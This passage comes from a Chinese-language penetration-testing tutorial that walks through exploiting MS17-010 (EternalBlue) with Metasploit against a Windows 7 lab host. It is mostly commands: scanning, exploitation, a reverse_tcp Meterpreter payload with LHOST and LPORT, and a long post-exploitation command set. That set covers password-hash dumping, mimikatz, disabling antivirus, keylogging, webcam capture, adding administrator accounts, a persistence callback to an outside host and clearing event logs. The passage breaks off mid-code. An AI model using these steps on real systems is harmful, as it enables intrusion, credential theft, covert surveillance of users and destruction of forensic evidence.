Framework中，Meterpreter是一种后渗透工具，它属于一种在运行过程中可通过网络进行功能扩展的动态可扩展型Payload。这种工具是基于“<code>内存DLL注入</code>”理念实现的，它能够通过创建一个新进程并调用注入的DLL来让目标系统运行注入的DLL文件</p><p><strong>Meterpreter是如何工作的？</strong></p><p>首先目标先要执行初始的<code>溢出漏洞</code>会话连接，可能是 bind正向连接，或者反弹 reverse 连接。反射连接的时候<code>加载dll</code>链接文件，同时后台悄悄处理 dll 文件。其次Meterpreter核心代码初始化,通过 socket套接字建立一个TLS&#x2F;1.0加密隧道并发送GET请求给Metasploit服务端。Metasploit服务端收到这个GET请求后就配置相应客户端。最后，Meterpreter加载扩展，所有的扩展被加载都通过TLS&#x2F;1.0进行数据传输。</p><p><strong>Meterpreter的特点</strong></p><ul><li><code>Meterpreter</code>完全驻留在<code>内存</code>，没有写入到磁盘。</li><li><code>Meterpreter</code>注入的时候不会产生新的进程，并可以很容易的移植到其它正在运行的进程。</li><li>默认情况下， <code>Meterpreter</code>的通信是加密的，所以很安全。</li><li>扩展性，许多新的特征模块可以被加载。<br>我们在设置<code>payloads</code> 时，可以将<code>payloads</code>设置为：<code>windows/meterpreter/reverse_tcp</code> ，然后获得了<code>meterpreter&gt;</code>之后我们就可以干很多事了！具体做的事，在我们下面的后渗透阶段都有讲！</li></ul><p>　查找漏洞相关模块：</p><p>1、在kali命令行里面输入命令msfconsole，进入msf框架中：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">msfconsole  #输入这个命令主要是进入msf渗透框架中<br></code></pre></td></tr></table></figure><p>2、搜索MS17_010漏洞：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">search ms17_010  #利用search命令，搜索漏洞相关利用模块<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/image-20250408151333706.png" alt="image-20250408151333706"></p><h2 id="4-Auxiliary辅助探测模块"><a href="#4-Auxiliary辅助探测模块" class="headerlink" title="4.Auxiliary辅助探测模块"></a>4.Auxiliary辅助探测模块</h2><p>利用Auxiliary辅助探测模块对漏洞进行探测：</p><p><code>Auxiliary辅助探测模块</code>：<br>该模块不会直接在攻击机和靶机之间建立访问，它们只负责执行扫描，嗅探，指纹识别等相关功能以辅助渗透测试。</p><p>1、使用smb_ms17_010漏洞探测模块对smb_ms17_010漏洞进行探测：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">use auxiliary/scanner/smb/smb_ms17_010<br></code></pre></td></tr></table></figure><p>2、查看这个模块需要配置的信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">show options<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/image-20250408155017277.png" alt="image-20250408155017277"></p><p>3、设置要探测的远程目标：</p><p>注：RHOSTS 参数是要探测主机的ip或ip范围，我们探测一个ip范围内的主机是否存在漏洞</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">set</span> rhost 10.0.0.1-10.0.0.254<br></code></pre></td></tr></table></figure><p>4、对上面设置的ip范围内的主机进行攻击：<br>注：有+号的就是可能存在漏洞的主机，这里有2个主机存在漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">run<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/image-20250408160119885.png" alt="image-20250408160119885"></p><h2 id="5-Exploit漏洞利用模块"><a href="#5-Exploit漏洞利用模块" class="headerlink" title="5.Exploit漏洞利用模块"></a>5.Exploit漏洞利用模块</h2><p>使用<code>Exploit漏洞利用模块</code>对漏洞进行利用：</p><p>1、选择漏洞攻击模块，对漏洞进行利用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">use exploit/windows/smb/ms17_010_eternalblue<br></code></pre></td></tr></table></figure><p>2、查看这个漏洞的信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">info<br></code></pre></td></tr></table></figure><p>3、查看可攻击的系统平台，显示当前攻击模块针对哪些特定操作系统版本、语言版本的系统</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">show targets  <br></code></pre></td></tr></table></figure><p>真好靶机就是Windows7</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/image-20250408160928288.png" alt="image-20250408160928288"></p><h2 id="6-Payload攻击载荷模块："><a href="#6-Payload攻击载荷模块：" class="headerlink" title="6.Payload攻击载荷模块："></a>6.Payload攻击载荷模块：</h2><p>攻击载荷是我们期望在目标系统在被渗透攻击之后完成的实际攻击功能的代码，成功渗透目标后，用于在目标系统上运行任意命令。</p><p>1、查看攻击载荷：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">show payloads      #该命令可以查看当前漏洞利用模块下可用的所有Payload<br></code></pre></td></tr></table></figure><p>2、设置攻击载荷：</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">set payload windows/x64/meterpreter/reverse_tcp<br></code></pre></td></tr></table></figure><p>关于reverse_ tcp与bind _tcp</p><ul><li>采用reverse的方法一般较为安全， 因为<code>是目标机主动连接攻击机</code>，所以一般不会被防火墙发现。</li><li>而采用bind的方法，<code>攻击机主动连接目标机</code>( 即需要在目标机上打开端口)时很容易被安全软件和防火墙发现。</li></ul><p>3、查看模块需要配置的参数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">show options<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/image-20250408161454008.png" alt="image-20250408161454008"></p><p>4、设置攻击载荷参数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apl">set RHOST 10.0.0.129   #设置RHOST，也就是要攻击主机的ip<br>set LHOST 10.0.0.128   #设置LHOST，也就是我们主机的ip，用于接收从目标机弹回来的shell<br>set lport 6666   #设置lport，也就是我们主机的端口，反弹shell到这个端口；如果我们这里不设置lport的话，默认是4444端口监听；<br></code></pre></td></tr></table></figure><h2 id="7-后渗透阶段："><a href="#7-后渗透阶段：" class="headerlink" title="7.后渗透阶段："></a>7.后渗透阶段：</h2><p>运行了<code>exploit命令</code>之后，我们开启了一个<code>reverse TCP监听器</code>来监听本地的<code>6666</code>端口，即我（攻击者）的本地主机地址（LHOST）和端口号（LPORT）。运行成功之后，我们将会看到命令提示符 <code>meterpreter &gt;</code> 出现，我们输入： shell 即可切换到目标主机的windows shell，要想从目标主机shell退出到 meterpreter ，我们只需输入：exit</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/image-20250408161658071.png" alt="image-20250408161658071"></p><p>　Meterpreter的命令用法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br></pre></td><td class="code"><pre><code class="hljs bash">Meterpreter &gt; ?<br>==========================================<br>核心命令：<br>==========================================<br>命令                           说明<br>-------                       ------------<br>?                             帮助菜单<br>background                    把当前会话挂到后台运行<br><span class="hljs-built_in">bg</span>                            background命令的别名<br>bgkill                        杀死后台meterpreter 脚本<br>bglist                        列出正在运行的后台脚本<br>bgrun                         执行一个meterpreter脚本作为后台线程<br>channel                       显示信息或控制活动频道<br>close                         关闭一个频道<br>detach                        分离Meterpreter会话（用于 http/https）<br>disable_unicode_encoding      禁用 unicode 字符串的编码<br>enable_unicode_encoding       启用 unicode 字符串的编码<br><span class="hljs-built_in">exit</span>                          终止 Meterpreter 会话<br>get_timeouts                  获取当前会话超时值<br>guid                          获取会话 GUID<br><span class="hljs-built_in">help</span>                          帮助菜单<br>info                          显示有关 Post 模块的信息<br>irb                           在当前会话中打开一个交互式 Ruby shell<br>load                          加载一个或多个 Meterpreter 扩展<br>machine_id                    获取连接到会话的机器的 MSF ID<br>migrate                       将服务器迁移到另一个进程<br>pivot                         管理枢轴侦听器<br>pry                           在当前会话上打开 Pry 调试器<br>quit                          终止 Meterpreter 会话<br><span class="hljs-built_in">read</span>                          从通道读取数据<br>resource                      运行存储在文件中的命令<br>run                           执行一个 Meterpreter 脚本或 Post 模块<br>secure                       （重新）协商会话上的 TLV 数据包加密<br>sessions                      快速切换到另一个会话<br>set_timeouts                  设置当前会话超时值<br><span class="hljs-built_in">sleep</span>                         强制 Meterpreter 安静，然后重新建立会话<br>ssl_verify                    修改 SSL 证书验证设置<br>transport                     管理运输机制<br>use                           不推荐使用的load命令别名<br>uuid                          获取当前会话的 UUID<br>write                         将数据写入通道<br><br>==========================================<br>Stdapi：文件系统命令<br>==========================================<br><br>命令                           说明<br>-------                       ------------<br><span class="hljs-built_in">cat</span>                           将文件内容读到屏幕上<br><span class="hljs-built_in">cd</span>                            切换目录<br>checksum                      检索文件的校验和<br><span class="hljs-built_in">cp</span>                            将源复制到目标<br>del                           删除指定文件<br><span class="hljs-built_in">dir</span>                           列出文件（<span class="hljs-built_in">ls</span> 的别名）<br>download                      下载文件或目录<br>edit                          编辑文件<br>getlwd                        打印本地工作目录<br>getwd                         打印工作目录<br>lcd                           更改本地工作目录<br>lls                           列出本地文件<br>lpwd                          打印本地工作目录<br><span class="hljs-built_in">ls</span>                            列出文件<br><span class="hljs-built_in">mkdir</span>                         制作目录<br><span class="hljs-built_in">mv</span>                            将源移动到目标<br><span class="hljs-built_in">pwd</span>                           打印工作目录<br><span class="hljs-built_in">rm</span>                            删除指定文件<br><span class="hljs-built_in">rmdir</span>                         删除目录<br>search                        搜索文件<br>show_mount                    列出所有挂载点/逻辑驱动器<br>upload                        上传文件或目录<br><br>==========================================<br>Stdapi：网络命令<br>==========================================<br>命令                           说明<br>-------                       ------------<br>arp                           显示主机 ARP 缓存<br>getproxy                      显示当前代理配置<br>ifconfig                      显示界面<br>ipconfig                      显示接口<br>netstat                       显示网络连接<br>portfwd                       将本地端口转发到远程服务<br>resolve                       解析目标上的一组主机名<br>route                         查看和修改路由表<br><br>==========================================<br>Stdapi：系统命令<br>==========================================<br>命令                           说明<br>-------                       ------------<br>clearev                       清除事件日志<br>drop_token                    放弃任何活动的模拟令牌。<br>execute                       执行命令<br>getenv                        获取一个或多个环境变量值<br>getpid                        获取当前进程标识符<br>getprivs                      尝试启用当前进程可用的所有权限<br>getid                         获取服务器运行的用户的 SID<br>getuid                        获取服务器运行的用户<br><span class="hljs-built_in">kill</span>                          终止进程<br>localtime                     显示目标系统本地日期和时间<br>pgrep                         按名称过滤进程<br>pkill                         按名称终止进程<br>ps                            列出正在运行的进程<br>reboot                        重启远程计算机<br>reg                           修改远程注册表并与之交互<br>rev2self                      在远程机器上调用 RevertToSelf()<br>shell                         放入系统命令 shell<br>shutdown                      关闭远程计算机<br>steal_token                   尝试从目标进程窃取模拟令牌<br><span class="hljs-built_in">suspend</span>                       暂停或恢复进程列表<br>sysinfo                       获取有关远程系统的信息，例如 OS<br><br>==========================================<br>Stdapi：用户界面命令<br>==========================================<br>命令                           说明<br>-------                       ------------<br>enumdesktops                  列出所有可访问的桌面和窗口站<br>getdesktop                    获取当前的meterpreter桌面<br>idletime                      返回远程用户空闲的秒数<br>keyboard_send                 发送击键<br>keyevent                      发送按键事件<br>keyscan_dump                  转储击键缓冲区<br>keyscan_start                 开始捕获击键<br>keyscan_stop                  停止捕获击键<br>mouse                         发送鼠标事件<br>screenshare                   实时观看远程用户桌面<br>screenshot                    抓取交互式桌面的截图<br>setdesktop                    更改meterpreters当前桌面<br>uictl                         控制一些用户界面组件<br><br>==========================================<br>Stdapi：网络摄像头命令：<br>==========================================<br>命令                           说明<br>-------                       ------------<br>record_mic                    从默认麦克风录制音频 X 秒<br>webcam_chat                   开始视频聊天<br>webcam_list                   列出网络摄像头<br>webcam_snap                   从指定的网络摄像头拍摄快照<br>webcam_stream                 从指定的网络摄像头播放视频流<br><br>==========================================<br>Stdapi：音频输出命令：<br>==========================================<br>命令                           说明<br>-------                       ------------<br>play                          在目标系统上播放波形音频文件 (.wav)<br><br>==========================================<br>Priv：权限提升命令：<br>==========================================<br>命令                           说明<br>-------                       ------------<br>getsystem                     尝试将您的权限提升到本地系统的权限。<br><br>==========================================<br>Priv：密码数据库命令：<br>==========================================<br>命令                           说明<br>-------                       ------------<br>hashdump                      转储 SAM 数据库的内容<br><br>==========================================<br>Priv：Timestomp 命令：<br>==========================================<br>命令                           说明<br>-------                       ------------<br>timestomp                     操作文件 MACE 属性<br><br>meterpreter &gt;<br></code></pre></td></tr></table></figure><p>常用的Meterpreter命令:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs shell">sysinfo             #查看目标主机系统信息<br>run scraper         #查看目标主机详细信息<br>run hashdump        #导出密码的哈希<br>load kiwi           #加载mimikatz<br>ps                  #查看目标主机进程信息<br>pwd                 #查看目标当前目录(windows)<br>getlwd              #查看目标当前目录(Linux)<br>search -f *.jsp -d e:\                #搜索E盘中所有以.jsp为后缀的文件<br>download  e:\test.txt  /root          #将目标机的e:\test.txt文件下载到/root目录下<br>upload    /root/test.txt d:\test      #将/root/test.txt上传到目标机的 d:\test\ 目录下<br>getpid             #查看当前Meterpreter Shell的进程PID<br>migrate 1384        #将当前Meterpreter Shell的进程迁移到PID为1384的进程上<br>idletime            #查看主机运行时间<br>getuid              #查看获取的当前权限<br>getsystem           #提权,获得的当前用户是administrator才能成功<br>run  killav         #关闭杀毒软件<br>screenshot          #截图<br>webcam_list         #查看目标主机的摄像头<br>webcam_snap         #拍照<br>webcam_stream       #开视频<br>execute 参数 -f 可执行文件       #执行可执行程序<br>run getgui -u test1 -p Abc123456    #创建test1用户，密码为Abc123456<br>run getgui -e                #开启远程桌面<br>keyscan_start                #开启键盘记录功能<br>keyscan_dump                 #显示捕捉到的键盘记录信息<br>keyscan_stop                 #停止键盘记录功能<br>uictl  disable  keyboard     #禁止目标使用键盘<br>uictl  enable   keyboard     #允许目标使用键盘<br>uictl  disable  mouse        #禁止目标使用鼠标<br>uictl  enable   mouse        #允许目标使用鼠标<br>load                        #使用扩展库<br>run             #使用扩展库<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">会自动连接192.168.100.132的8888端口，缺点是容易被杀毒软件查杀</span> <br>run exploit/windows/local/persistence lhost=192.168.100.132 lport=8888        <br><span class="hljs-meta prompt_">#</span><span class="language-bash">将192.168.11.13的3389端口转发到本地的9999端口上，这里的192.168.100.158是获取权限的主机的ip地址</span><br>portfwd add -l 9999 -r 192.168.100.158 -p 3389     <br>clearev                                                 #清除日志<br></code></pre></td></tr></table></figure><p>我们输入： shell即可切换到目标主机的windows cmd_shell里面：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">shell         <span class="hljs-comment">#获取目标主机的cmd_shell权限</span><br>chcp 65001    <span class="hljs-comment">#这里为了避免目标主机cmd_shell字符乱码，设置目标主机命令行的字符编码，65001是UTF-8</span><br></code></pre></td></tr></table></figure><p>要想从目标主机shell退出到<code>meterpreter</code> ，我们只需输入：<code>exit</code></p><p>从meterpreter退出到MSF框架:  我们只需输入：background </p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/image-20250408162805517.png" alt="image-20250408162805517"></p><p>查看前面获得的<code>meterpreter_shell</code>会话，最前面的数字是会话的id：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sessions  -l<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/image-20250408162851667.png" alt="image-20250408162851667"></p><p>输入sessions [id号]即可进入相应的<code>meterpreter_shell</code>中：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sessions 3<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/image-20250408162947189.png" alt="image-20250408162947189"></p><h3 id="7-1-Post-后渗透模块"><a href="#7-1-Post-后渗透模块" class="headerlink" title="7.1 Post 后渗透模块"></a><strong>7.1 Post 后渗透模块</strong></h3><p>该模块主要用于在取得目标主机系统远程控制权后，进行一系列的后渗透攻击动作。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs apl">run post/windows/manage/migrate                #自动进程迁移<br>run post/windows/gather/checkvm                #查看目标主机是否运行在虚拟机上<br>run post/windows/manage/killav                #关闭杀毒软件<br>run post/windows/manage/enable_rdp            #开启远程桌面服务<br>run post/windows/manage/autoroute              #查看路由信息<br>run post/windows/gather/enum_logged_on_users    #列举当前登录的用户<br>run post/windows/gather/enum_applications       #列举应用程序<br>run post/windows/gather/credentials/windows_autologin #抓取自动登录的用户名和密码<br>run post/windows/gather/smart_hashdump               #dump出所有用户的hash<br></code></pre></td></tr></table></figure><p>输入：sysinfo 查看目标主机的信息:</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/image-20250408163406636.png" alt="image-20250408163406636"></p><h3 id="7-2-查看主机是否运行在虚拟机上"><a href="#7-2-查看主机是否运行在虚拟机上" class="headerlink" title="7.2 查看主机是否运行在虚拟机上:"></a><strong>7.2 查看主机是否运行在虚拟机上:</strong></h3><p>查看主机是否运行在虚拟机上，可以看出主机是在虚拟机环境</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">run post/windows/gather/checkvm<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/image-20250408163511981.png" alt="image-20250408163511981"></p><h3 id="7-3-关闭杀毒软件："><a href="#7-3-关闭杀毒软件：" class="headerlink" title="7.3 关闭杀毒软件："></a><strong>7.3 关闭杀毒软件：</strong></h3><p>拿到目标主机的shell后第一件事就是关闭掉目标主机的杀毒软件，通过命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">run post/windows/manage/killav<br></code></pre></td></tr></table></figure><h3 id="7-4-获取目标主机的详细信息："><a href="#7-4-获取目标主机的详细信息：" class="headerlink" title="7.4 获取目标主机的详细信息："></a><strong>7.4 获取目标主机的详细信息：</strong></h3><p>它将目标机器上的常见信息收集起来然后下载保存在本地</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">run scraper <br></code></pre></td></tr></table></figure><h3 id="7-5-访问文件系统："><a href="#7-5-访问文件系统：" class="headerlink" title="7.5 访问文件系统："></a><strong>7.5 访问文件系统：</strong></h3><p>Meterpreter支持非常多的文件系统命令（基本跟Linux系统命令类似），一些常用命令如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">pwd</span>     <span class="hljs-comment">#查看当前目录</span><br><span class="hljs-built_in">cd</span>      <span class="hljs-comment">#切换目标目录；</span><br><span class="hljs-built_in">cat</span>     <span class="hljs-comment">#读取文件内容；</span><br><span class="hljs-built_in">rm</span>      <span class="hljs-comment">#删除文件；</span><br>edit    <span class="hljs-comment">#使用vim编辑文件</span><br><span class="hljs-built_in">ls</span>      <span class="hljs-comment">#获取当前目录下的文件；</span><br><span class="hljs-built_in">mkdir</span>   <span class="hljs-comment">#新建目录；</span><br><span class="hljs-built_in">rmdir</span>   <span class="hljs-comment">#删除目录； </span><br></code></pre></td></tr></table></figure><h3 id="7-6-上传-下载文件："><a href="#7-6-上传-下载文件：" class="headerlink" title="7.6 上传&#x2F;下载文件："></a><strong>7.6 上传&#x2F;下载文件：</strong></h3><p>下载文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">download  file<br></code></pre></td></tr></table></figure><p>上传文件:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">upload  file <br></code></pre></td></tr></table></figure><h3 id="7-7-权限提升："><a href="#7-7-权限提升：" class="headerlink" title="7.7 权限提升："></a><strong>7.7 权限提升：</strong></h3><p>有的时候，你可能会发现自己的 Meterpreter 会话受到了用户权限的限制，而这将会严重影响你在目标系统中的活动。比如说，修改注册表、安装后门或导出密码等活动都需要提升用户权限，而Meterpreter给我们提供了一个 getsystem 命令，它可以使用多种技术在目标系统中实现提权。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apl">#自动提权为系统权限<br>getsystem<br>#命令可以获取当前用户的信息，可以看到，当我们使用 getsystem进行提权后，用户权限为  NT AUTHORITY\SYSTEM ，这个也就是Windows的系统权限。<br>getuid<br></code></pre></td></tr></table></figure><p>注：执行getsystem命令后，会显示错误，但是其实已经运行成功了！</p><h3 id="7-8-获取用户密码"><a href="#7-8-获取用户密码" class="headerlink" title="7.8 获取用户密码"></a><strong>7.8 获取用户密码</strong></h3><p>参考链接：<a href="https://blog.csdn.net/weixin_45588247/article/details/119519411?spm=1001.2014.3001.5501">https://blog.csdn.net/weixin_45588247/article/details/119519411?spm=1001.2014.3001.5501</a></p><h3 id="7-9-运行程序："><a href="#7-9-运行程序：" class="headerlink" title="7.9 运行程序："></a><strong>7.9 运行程序：</strong></h3><p>先查看目标主机安装了哪些应用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">run post/windows/gather/enum_applications <br></code></pre></td></tr></table></figure><p>在meterpreter_shell命令行执行目标系统中的应用程序：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs apl">#execute命令用法：<br>execute [参数] -f 指定的可执行文件<br><br>-f：指定可执行文件<br>-H：创建一个隐藏进程<br>-a：传递给命令的参数<br>-i：跟进程进行交互<br>-m：从内存中执行<br>-t：使用当前伪造的线程令牌运行进程<br>-s：在给定会话中执行进程<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/image-20250408165109773.png" alt="image-20250408165109773"></p><h3 id="7-11-屏幕截图"><a href="#7-11-屏幕截图" class="headerlink" title="7.11 屏幕截图"></a><strong>7.11 屏幕截图</strong></h3><p>1、截图目标主机屏幕，可以看到，图片被保存到了<code>/root/桌面/</code>目录下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">screenshot           <span class="hljs-comment">#截图目标主机屏幕</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/image-20250408165236346.png" alt="image-20250408165236346"></p><h3 id="7-12-创建一个新账号："><a href="#7-12-创建一个新账号：" class="headerlink" title="7.12 创建一个新账号："></a><strong>7.12 创建一个新账号：</strong></h3><p>先查看目标主机有哪些用户：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">run post/windows/gather/enum_logged_on_users <br></code></pre></td></tr></table></figure><p>在目标系统中创建一个新的用户账号的方法一：</p><p>注：这个命令会创建用户，并把他添加到 Administrators 组中，这样该用户就拥有远程桌面的权限了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apl">run getgui -u 用户 -p 密码<br>-u: 指定用户<br>-p: 指定密码<br></code></pre></td></tr></table></figure><p>在目标系统中创建一个新的用户账号的方法二：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs 